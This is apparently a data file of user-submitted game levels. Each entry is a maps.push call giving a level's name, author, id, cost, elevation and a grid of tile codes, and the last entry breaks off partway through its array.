maps.push({name="Void Elevation",author="Morell",id="#1650656680",direction="forward",cost=187,elevation=14,map=[90,19,19,19,19,19,0,0,0,2,2,0,0,0,0,0,0,0,0,0,19,19,19,90,19,19,0,0,0,5,5,0,0,0,0,0,7,7,7,7,19,19,0,0,0,0,0,0,0,5,5,0,0,0,0,0,6,6,8,8,92,92,0,0,0,0,0,0,0,5,5,0,0,0,0,0,5,5,9,9,0,0,0,0,92,92,0,0,0,90,5,5,5,5,91,5,5,5,10,10,0,0,0,0,23,23,0,0,0,93,5,5,90,5,91,5,5,90,11,11,19,19,0,0,23,23,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,19,19,19,0,0,0,0,0,0,0,0,0,0,0,12,12,19,19,0,0,19,19,19,19,92,13,13,13,90,0,0,0,0,0,12,12,0,92,0,0,0,19,19,19,80,13,13,13,13,0,0,0,0,0,92,92,0,0,0,0,0,0,19,19,92,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,92,0,0,0,0,0,0,0,0,0,0,91,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,92,12,12,12,19,19,0,0,0,0,0,0,0,0,0,12,12,0,0,0,92,12,12,94,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="zesnake",author="DailyFirefuck",id="#1650657339",direction="left",cost=169,elevation=9,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,76,0,76,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,76,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,15,15,15,0,0,0,0,0,0,0,0,0,0,0,6,6,6,0,0,15,15,15,15,0,0,0,11,11,10,10,0,0,0,0,6,6,6,0,0,15,65,15,15,0,0,11,11,11,10,10,10,0,0,7,7,7,7,0,0,15,15,15,15,0,0,11,11,11,10,10,10,0,0,7,7,7,7,0,0,15,15,15,15,0,0,11,11,11,10,10,10,0,0,7,7,7,0,0,0,0,14,14,14,0,12,11,11,0,10,10,10,0,0,8,8,8,0,0,0,2,14,14,14,0,12,12,12,0,10,10,9,9,0,8,8,8,0,0,0,2,14,14,13,13,12,12,12,0,0,9,9,9,9,8,8,8,0,0,0,0,14,13,13,13,12,12,0,0,0,9,9,9,9,8,8,8,0,0,0,0,0,13,13,13,13,0,0,0,0,9,9,9,9,8,8,8,0,0,0,0,0,0,13,13,0,0,0,0,0,0,9,9,9,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,8,0,0,0,0,0,0,0,0,33,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,33,0,33,0,33,0,33,0,31,31,31,0,0,0,0,0,0,33,33,0,0,0,0,0,0,0,0,0,31,94,31,0,0,0,0,0,0,93,33,0,0,0,0,0,0,0,0,0,31,31,31,0,0,0,0,0,0]});
maps.push({name="oavuemhksj",author="no",id="#1650660189",direction="right",cost=227,elevation=0,map=[1,2,2,1,1,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,1,14,14,14,14,14,14,14,95,14,14,14,14,14,14,14,14,14,93,14,1,14,14,14,14,14,14,14,95,14,14,14,14,14,14,14,14,14,14,14,0,13,13,0,34,34,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,12,12,0,0,85,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,11,11,0,0,34,34,0,0,0,0,0,0,0,0,0,0,14,14,0,0,10,10,0,0,0,34,34,91,34,34,0,0,0,0,0,0,14,14,0,0,9,9,0,0,0,0,0,0,0,34,34,0,0,0,0,0,14,14,0,0,8,8,0,0,0,0,0,0,0,0,85,0,0,0,0,0,91,91,0,0,7,7,0,0,0,0,0,0,0,0,34,34,0,0,0,0,91,91,0,0,6,6,0,0,25,25,25,25,0,0,0,34,34,86,34,0,91,91,0,0,25,25,25,25,25,0,0,92,0,0,0,0,0,0,34,0,14,14,0,0,0,25,0,0,0,0,0,29,0,0,0,0,0,0,34,0,95,95,0,25,25,0,0,0,0,0,0,29,29,29,0,0,0,0,91,0,14,14,0,0,0,25,0,0,0,0,0,0,0,91,0,0,0,0,34,34,14,14,0,0,25,0,25,0,0,0,0,0,0,29,29,29,0,0,0,34,14,14,1,0,25,0,5,5,5,5,5,0,0,0,0,29,0,0,0,0,14,14,1,0,0,5,5,75,75,75,5,5,6,7,8,9,10,11,12,13,14,14,2,0,0,5,5,75,75,75,5,5,6,7,8,9,10,11,12,13,14,14,2,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,1,1,1]});
maps.push({name="trapescape",author="Fara",id="#1650660620",direction="forward",cost=185,elevation=0,map=[0,0,0,0,0,0,0,13,2,2,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,89,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,89,13,13,89,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,89,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,89,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,89,89,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,89,13,89,0,0,0,0,0,0,0,0,0,0,0,0,98,0,0,0,13,13,13,89,0,0,0,95,0,0,0,0,0,33,33,33,98,0,0,0,89,13,89,13,0,0,0,95,41,41,41,0,0,33,93,33,98,33,33,0,13,13,13,13,92,41,41,95,41,97,41,0,0,33,33,33,98,0,0,0,89,13,13,89,0,0,0,95,41,41,41,0,0,0,0,0,98,0,0,0,13,89,13,13,0,0,0,95,0,0,42,0,0,0,0,0,0,0,0,0,13,13,13,89,0,0,0,0,0,0,42,0,0,0,0,0,0,0,0,0,89,13,89,13,0,0,0,0,0,0,42,0,0,0,0,0,0,0,0,0,13,13,13,89,0,0,0,0,95,95,95,95,95,0,0,0,0,0,0,0,89,13,89,13,0,0,0,0,0,42,42,42,0,0,0,0,0,0,0,0,13,13,13,13,0,0,0,0,0,42,99,42,0,0,0,0,0,0,0,0,89,13,13,89,0,0,0,0,0,42,42,42,0,0,0,0,0,0,96,96,96,96,96,96,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,2,2,89,0,0,0,0,0,0,0,0,0]});
maps.push({name="spiral tower",author="yesme",id="#1650664567",direction="right",cost=255,elevation=18,map=[2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,5,9,9,9,9,8,8,8,8,8,7,7,7,7,7,6,5,0,24,24,5,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,24,5,10,0,14,14,14,14,14,13,13,13,13,13,12,12,12,12,0,77,24,5,10,0,15,0,0,0,0,0,0,0,97,37,0,0,0,12,0,24,24,5,10,0,15,0,18,18,18,17,96,96,17,17,16,16,0,11,0,77,24,5,10,0,15,0,18,0,0,0,0,0,0,0,0,16,0,11,0,77,24,5,10,0,15,0,18,0,21,20,20,19,19,19,0,16,0,11,0,24,23,5,11,0,15,0,19,23,22,23,23,23,23,19,23,16,23,11,23,23,2,5,11,0,16,0,19,23,23,23,23,22,23,19,23,15,23,11,23,23,2,5,11,0,16,0,19,19,19,20,20,21,0,18,0,15,0,10,0,24,23,5,11,0,16,0,0,0,0,0,0,0,0,18,0,15,0,10,0,77,24,5,11,0,16,16,17,17,98,98,17,18,18,18,0,15,0,10,0,77,24,5,12,0,0,0,37,99,0,0,0,0,0,0,0,15,0,10,0,24,24,5,12,12,12,12,13,13,13,13,13,14,14,14,14,14,0,10,0,77,24,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,0,77,24,6,7,7,7,7,7,8,8,8,8,8,8,9,9,9,9,9,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="vauffs feet",author="you know who",id="#1650665624",direction="forward",cost=175,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,5,1,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,5,5,1,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,5,5,1,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,5,1,1,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,5,5,1,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,5,5,5,1,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,5,5,5,5,1,0,0,0,0,0,0,0,0,1,5,5,5,5,5,5,5,5,5,5,1,0,0,0,0,0,0,0,0,1,5,5,5,5,5,5,5,5,5,5,1,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,5,5,5,1,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,5,5,5,1,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,95,1,0,0,0,0,0,0,0,0,0,0,0,1,5,1,5,1,5,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,1,1,5,1,5,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,2,2,0,0,0,0,0,0]});
maps.push({name="Hold Em v11",author="fantasy",id="#1650667602",direction="forward",cost=104,elevation=0,map=[0,0,0,0,0,0,0,0,24,2,2,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,54,54,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,95,95,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,54,97,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,54,54,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,96,96,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,54,54,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,54,99,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,54,54,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,98,98,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,54,54,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,54,102,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,54,54,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,101,101,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,54,54,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,54,104,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,54,54,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,103,103,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,54,54,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,2,2,24,0,0,0,0,0,0,0,0]});
maps.push({name="Whats going on here",author="lamp",id="#1650667895",direction="right",cost=276,elevation=3,map=[0,0,0,0,0,2,2,0,0,0,0,0,0,9,9,9,9,9,9,0,0,0,0,0,0,5,5,92,0,0,0,0,0,5,6,7,7,7,9,0,0,0,0,0,0,6,6,0,0,0,0,0,0,9,9,9,9,7,9,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,9,7,9,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,9,9,92,0,0,25,25,25,25,25,9,87,97,9,0,0,27,0,27,0,9,9,0,0,0,25,0,0,0,0,9,9,9,9,0,0,0,0,0,0,8,8,0,0,101,101,101,0,0,0,0,0,9,0,0,0,26,0,0,0,8,8,0,0,0,25,0,0,0,0,98,98,98,98,98,0,0,0,0,0,8,8,0,0,25,25,25,1,0,0,0,0,9,0,0,0,25,0,0,0,8,8,0,0,25,3,25,1,0,0,0,0,8,0,0,0,0,0,0,0,8,8,8,8,8,8,96,8,8,8,8,8,8,8,2,0,25,0,0,0,8,8,8,8,8,8,96,8,8,8,8,8,8,8,2,0,0,0,0,0,0,0,0,0,1,1,1,1,5,4,5,8,102,8,0,5,5,5,0,0,5,5,5,5,5,5,5,5,103,5,5,8,8,8,0,5,4,5,0,0,5,5,5,5,5,5,5,5,5,103,5,8,66,8,0,24,24,24,0,0,5,5,5,5,5,5,5,5,1,1,1,8,8,8,0,24,24,24,0,1,1,1,1,24,1,24,1,24,24,96,24,24,24,24,24,24,24,24,0,0,0,92,0,24,1,24,1,24,24,96,24,99,104,93,24,24,24,24,0,0,0,0,0,24,1,24,1,24,24,96,24,24,24,24,24]});
maps.push({name="3 ways up",author="Wolfdiman",id="#1650668682",direction="forward",cost=434,elevation=11,map=[1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,10,10,10,10,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,10,1,1,10,1,1,1,1,1,1,1,1,1,16,16,15,14,13,12,11,10,1,1,10,11,12,14,13,15,16,16,1,1,16,16,15,14,13,12,11,10,10,10,10,11,12,13,14,15,16,16,1,1,1,17,1,1,1,1,1,1,10,10,1,1,1,1,1,1,17,1,1,1,1,18,1,1,1,1,1,1,10,10,1,1,1,1,1,1,18,1,1,1,19,19,19,1,1,1,1,1,10,10,1,1,1,1,1,19,19,19,1,1,19,1,19,97,1,1,1,1,10,10,1,1,1,1,97,19,1,19,1,1,19,19,19,1,1,1,1,1,10,10,1,1,1,1,1,19,19,19,1,1,1,19,1,1,1,10,10,10,96,96,10,10,10,1,1,1,19,1,1,1,1,96,1,1,1,10,1,10,92,92,10,1,10,1,1,1,96,1,1,1,1,19,1,1,1,10,1,21,21,21,21,1,10,1,1,1,19,1,1,1,1,20,1,1,1,10,4,21,21,21,21,4,10,1,1,1,20,1,1,1,1,21,1,1,1,1,1,21,21,21,21,1,1,1,1,1,21,1,1,1,21,21,21,1,1,1,1,1,98,98,1,1,1,1,1,21,21,21,1,1,21,21,21,1,1,1,21,21,21,21,21,21,1,1,1,21,21,21,1,1,21,21,21,98,75,21,21,21,21,21,21,21,21,75,98,21,21,21,1,1,21,99,21,1,1,1,21,100,21,21,100,21,1,1,1,21,99,21,1,1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1]});
maps.push({name="splitv2",author="skidward",id="#1650669261",direction="forward",cost=410,elevation=5,map=[0,2,2,0,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,0,24,5,5,24,24,10,10,10,10,10,10,12,14,16,18,19,19,19,24,24,24,6,6,24,10,10,10,10,10,10,10,12,14,16,18,19,19,19,19,24,24,7,7,24,10,10,10,10,21,21,21,21,22,23,24,24,19,19,19,24,24,66,66,24,9,24,10,10,10,10,10,10,10,10,10,24,19,90,19,24,24,68,68,24,9,24,9,10,10,10,10,10,10,10,10,24,19,19,19,24,24,68,68,24,9,24,9,24,24,24,24,24,24,10,10,24,19,19,19,24,24,68,68,24,9,24,9,24,24,0,0,24,24,10,10,24,19,19,90,24,24,68,68,24,9,9,9,8,24,0,24,10,10,10,10,24,19,19,19,24,24,66,66,24,8,8,8,8,24,24,10,91,10,10,10,24,19,19,19,24,24,7,7,24,24,7,7,7,24,24,10,10,24,10,10,24,19,19,19,24,24,7,7,96,7,7,7,24,24,24,91,91,24,10,10,24,90,19,19,24,24,7,7,96,7,7,24,24,0,24,10,10,24,10,10,24,19,19,19,24,24,7,7,24,24,24,24,24,24,24,91,91,24,10,10,24,19,19,19,24,24,8,8,24,14,8,8,15,15,24,10,10,24,10,10,24,19,19,90,24,24,10,24,24,8,8,15,15,93,24,10,91,10,10,10,21,19,19,19,24,24,8,8,8,8,13,8,15,94,24,24,10,10,10,10,21,19,19,19,24,24,8,11,8,8,8,8,15,97,24,0,24,24,10,10,24,19,100,19,24,24,8,8,8,12,8,8,15,15,24,0,0,24,10,10,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,0,0,0,2,2,0,0,0,0,0]});
maps.push({name="Over and Under",author="tilgep",id="#1650670860",direction="right",cost=229,elevation=-10,map=[0,0,22,24,24,23,24,1,2,2,0,0,0,0,0,1,1,1,1,1,0,0,14,14,15,15,16,17,17,17,0,0,0,0,0,1,45,100,45,1,0,14,14,14,14,15,16,16,17,17,0,0,0,0,0,1,45,45,45,1,0,14,14,13,13,15,15,16,16,0,0,0,0,0,0,0,32,46,32,0,23,14,12,12,0,0,1,0,0,0,0,0,1,0,0,0,32,46,32,0,22,14,11,0,1,0,0,0,0,1,0,0,0,0,0,1,47,47,47,1,24,14,10,1,0,0,0,0,0,0,0,0,0,0,0,1,47,47,47,1,24,14,9,35,35,36,36,36,24,37,37,36,36,36,35,1,47,47,47,1,24,48,48,49,49,50,50,50,51,51,51,23,50,50,49,49,48,48,48,1,23,48,48,49,24,50,24,50,51,51,51,50,50,24,49,49,48,48,48,1,24,48,48,49,49,50,50,23,51,51,51,50,50,50,49,49,48,24,48,1,24,48,48,49,49,50,50,50,51,24,51,50,50,50,49,49,48,48,48,1,23,0,0,35,35,36,36,36,37,24,37,36,36,36,35,35,34,48,48,1,0,0,0,0,0,0,0,0,0,0,0,23,0,0,0,0,33,47,47,1,0,0,0,0,0,0,0,0,0,0,0,0,37,23,0,0,33,47,7,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,33,47,7,2,0,0,0,0,0,0,0,0,0,0,0,0,38,0,0,0,33,47,47,1,0,0,0,0,0,0,0,0,0,0,0,0,0,24,0,0,33,33,33,1,0,0,0,0,0,0,0,0,0,0,0,0,39,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,39,100,39,0,0,0,0,0,0]});
maps.push({name="Cover The Triggers",author="DankArab",id="#1650671339",direction="forward",cost=227,elevation=12,map=[2,2,0,0,0,28,28,28,28,28,9,0,0,9,0,0,0,0,0,0,28,28,0,0,0,28,28,28,28,28,0,0,0,0,0,0,0,0,0,0,28,28,28,28,28,28,28,93,28,28,0,0,0,0,9,0,0,0,0,0,28,28,28,28,28,28,28,94,28,28,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,28,28,28,28,28,0,0,0,0,9,0,0,0,9,9,0,0,0,0,0,28,28,28,28,28,0,0,0,0,0,0,9,0,0,97,0,0,0,0,0,96,96,96,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,28,28,28,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,3,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,0,0,0,0,98,98,0,0,0,0,0,40,40,91,91,91,91,40,40,40,40,40,40,40,98,40,0,0,0,0,0,40,40,91,91,91,91,40,40,40,40,40,40,40,98,40,0,0,0,0,0,99,40,91,91,91,91,40,40,40,40,40,40,40,98,40,40,40,40,40,40,40,40,91,91,91,91,40,40,40,40,40,40,40,98,40,0,0,0,40,40,40,40,91,91,91,91,40,40,40,40,40,40,40,98,40,0,0,0,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,98,98,0,0,0,2,2]});
maps.push({name="The Great Migration",author="lamp",id="#1650671680",direction="forward",cost=290,elevation=17,map=[2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,6,6,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,7,7,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,8,8,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,9,9,92,0,0,0,5,5,5,5,5,5,5,5,5,0,0,0,9,9,10,10,92,0,0,0,5,5,77,77,77,5,5,5,5,0,0,0,10,10,11,11,92,0,0,0,5,77,0,76,76,77,5,5,5,0,0,0,11,11,12,12,92,0,0,0,5,77,76,76,76,76,77,5,5,0,0,0,12,12,13,13,92,0,0,0,5,5,77,76,76,76,76,77,5,0,0,0,13,13,14,14,92,0,0,0,5,77,76,76,76,76,77,5,5,0,0,0,14,14,15,15,92,0,0,0,5,77,76,76,76,77,5,5,5,0,0,0,15,15,16,16,92,0,0,0,5,5,77,77,77,5,5,5,5,0,0,0,16,16,17,17,92,0,0,0,5,5,5,5,5,5,5,5,5,0,0,0,17,17,18,18,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,19,19,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,20,20,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,21,21,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,21,21,22,22,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2]});
maps.push({name="Elevated",author="SEAL",id="#1650673179",direction="forward",cost=272,elevation=19,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,5,5,5,5,5,5,10,85,85,10,0,0,0,0,0,0,10,99,85,10,92,5,5,5,5,92,10,10,97,10,0,0,0,0,0,0,85,10,10,10,5,5,5,5,5,5,10,85,10,10,0,0,0,0,0,0,10,10,85,10,5,5,5,5,5,5,10,10,10,10,0,0,0,0,0,0,96,96,0,0,24,24,24,24,24,24,0,0,98,98,0,0,0,0,0,96,10,10,96,0,94,24,87,87,24,93,0,98,10,10,98,0,0,0,0,0,10,10,0,0,0,95,24,24,95,0,0,0,10,10,0,0,0,0,0,0,92,10,0,0,103,0,95,95,0,101,0,0,10,92,0,0,0,0,0,0,16,16,16,20,103,20,24,24,20,101,20,16,16,16,0,0,0,0,0,0,16,92,20,103,20,92,24,24,92,20,101,20,92,16,0,0,0,0,16,0,16,16,16,20,103,20,24,24,20,101,20,16,16,16,0,16,0,0,35,0,0,0,0,0,103,0,92,92,0,101,0,0,0,0,0,35,0,0,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,0,0,34,34,33,33,12,85,0,0,0,0,0,0,85,12,33,33,34,34,0,0,0,0,0,0,0,12,0,0,0,0,0,0,12,0,0,0,0,0,0,0,0,0,0,0,0,3,0,0,0,0,0,0,3,0,0,0,0,0,0,0,5,5,0,0,0,9,0,0,24,24,0,0,9,0,0,0,5,5,0,0,102,5,5,3,9,9,0,0,24,24,0,0,9,9,3,5,5,104,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Slippery Slope",author="tilgep",id="#1650673479",direction="forward",cost=172,elevation=-16,map=[0,0,0,0,0,0,24,24,24,2,2,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,23,23,23,23,23,23,23,23,0,0,0,0,0,0,0,0,0,0,0,67,22,22,22,1,22,22,22,22,67,0,0,0,0,0,0,0,0,0,0,0,21,21,21,21,21,21,21,1,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,19,19,21,21,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,18,18,22,22,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,17,17,23,23,1,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,16,16,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,1,15,15,15,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,13,13,13,13,1,0,0,0,0,0,0,0,0,0,0,0,77,13,13,1,13,13,13,13,13,77,0,0,0,0,0,0,0,0,0,0,0,12,12,12,12,12,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,10,10,1,10,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,8,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,2,2,8,8,8,0,0,0,0,0,0]});
maps.push({name="go trigger guys",author="niku",id="#1650675289",direction="forward",cost=196,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,5,5,5,5,25,25,25,25,5,5,5,5,0,0,0,0,0,0,0,0,5,5,5,25,25,25,25,25,25,5,5,5,0,0,0,0,0,0,0,0,5,5,5,25,85,5,5,5,25,5,5,5,0,0,0,0,1,1,1,1,25,25,25,25,5,5,5,85,25,25,25,25,1,1,1,1,1,1,1,1,25,0,0,25,5,85,5,5,25,0,0,25,1,1,1,1,1,1,1,1,25,0,0,25,5,5,85,5,25,0,0,25,1,1,1,1,0,0,25,25,0,0,0,25,5,85,5,5,25,0,0,0,25,25,0,0,25,0,0,0,0,0,0,25,5,5,5,85,25,0,0,0,0,0,0,25,25,0,0,0,0,0,0,25,85,5,5,5,25,0,0,0,0,0,0,25,25,0,0,25,25,25,25,25,25,25,25,25,25,25,25,25,25,0,0,25,0,0,0,25,0,0,0,5,5,5,5,5,5,0,0,0,25,0,0,0,5,5,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,5,5,5,5,5,0,0,0,0,0,0,5,5,0,0,0,0,0,0,5,5,5,5,100,5,0,0,0,0,0,0,5,5,0,0,0,0,0,0,5,100,5,5,5,5,0,0,0,0,0,0,2,2,0,0,0,0,0,0,5,5,5]});
maps.push({name="zepokemononix",author="Jussy",id="#1650677682",direction="forward",cost=106,elevation=11,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,8,8,0,0,0,0,0,16,16,14,14,14,13,0,0,0,0,0,0,0,8,8,0,0,0,0,16,16,16,0,0,13,13,0,0,0,0,0,9,9,8,8,0,0,0,16,16,16,16,0,0,13,13,0,0,0,0,0,9,9,0,0,16,16,16,16,16,16,16,0,0,0,12,12,0,0,10,10,9,9,0,0,0,0,16,16,91,16,16,0,0,0,12,12,0,0,10,10,0,0,0,0,0,0,0,16,16,16,16,0,0,0,12,11,11,11,10,10,0,0,0,0,0,0,0,0,16,16,16,0,0,0,0,11,11,11,0,0,0,0,0,0,0,0,0,0,0,91,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,91,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Budget Crazy Escape",author="DankArab",id="#1650681347",direction="forward",cost=861,elevation=0,map=[2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,44,44,81,44,81,44,81,81,81,81,81,81,81,81,81,81,81,81,1,1,44,44,81,81,81,44,81,81,81,81,44,44,81,44,44,44,81,81,1,1,81,81,81,81,81,81,81,81,81,81,44,44,81,81,44,44,81,81,1,1,44,81,81,81,44,81,81,81,81,81,44,44,81,81,44,44,81,81,1,1,81,81,81,81,81,44,44,44,44,81,44,44,81,81,44,44,81,81,1,1,44,44,44,81,81,44,44,44,44,81,81,81,81,81,81,81,81,81,1,1,81,81,81,81,81,81,81,81,81,81,81,81,81,81,81,44,44,44,1,1,81,81,81,81,81,81,81,81,81,81,81,81,81,81,81,44,44,44,1,1,81,81,81,81,81,81,81,81,81,81,81,81,81,81,81,81,81,81,1,1,81,44,44,44,81,81,81,44,44,44,44,81,81,44,44,44,81,81,1,1,81,44,44,44,81,44,81,44,44,44,44,81,81,44,44,44,81,81,1,1,81,81,81,81,81,81,